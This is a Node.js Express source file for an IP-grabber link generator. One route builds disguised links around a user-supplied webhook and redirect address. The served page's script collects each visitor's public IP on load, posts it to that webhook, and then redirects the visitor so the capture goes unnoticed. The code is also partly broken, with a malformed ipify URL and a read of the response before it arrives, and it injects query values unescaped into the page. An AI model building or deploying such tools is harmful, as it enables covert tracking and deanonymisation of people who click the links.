const express = require('express');
const app = express();
const path = require('path');

app.get('/', (req, res) => {
  if ("hook" in req.query && "redirect" in req.query) {
    res.send(`
    <html>
    <body>
    hi there ;)
    <script>
    function IPgrab()
    {
    const xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
    console.log(xhr.responseText);
    }
    };
    xhr.open("GET", "https//api.ipify.org/?format=text");
    xhr.send();
    var IP =  xhr.responseText;
    var request = new XMLHttpRequest();
    request.open('POST', '${ req.query.hook }');
    request.setRequestHeader('Content-type', 'application/json');
    var params = {content: IP}
    request.send(JSON.stringify(params));
    window.location.replace('${ req.query.redirect }');
    }
    window.onload = IPgrab();
    </script>
    </body>
    </html>`);
  } else {
    res.sendFile(path.join(__dirname+'/index.html'));
  }
});

app.get('/create', (req, res) => {
  if ("hook" in req.query && "redirect" in req.query) {
    var new_URL = `https://xyz.webhooks.repl.co?hook=${ encodeURIComponent(req.query.hook) }&redirect=${ encodeURIComponent(req.query.redirect) }`
    res.send(`<h1>Your Link has been generated succesfully</h1><br><textarea rows="1" cols="1000">${ new_URL }</textarea><br>`)
  }
});

app.listen(3000, () => {
  console.log('server started');
});